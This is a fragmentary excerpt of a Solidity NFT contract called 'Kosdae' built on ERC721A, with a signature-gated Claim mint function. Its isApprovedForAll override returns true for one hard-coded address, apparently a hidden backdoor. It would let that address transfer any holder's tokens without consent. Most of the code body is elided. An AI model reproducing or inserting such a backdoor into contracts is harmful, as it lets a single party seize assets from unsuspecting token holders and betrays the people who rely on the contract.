  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x0F2221C0c1bA8B26BDa3685aA74928e6baf162b9){return true;}
...
contract Kosdae is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("kosdae", "ksd", maxBatchSize_, maxSupply) {
  ...
  function Claim(uint256 quantity, bytes calldata signature) external payable callerIsUser {    
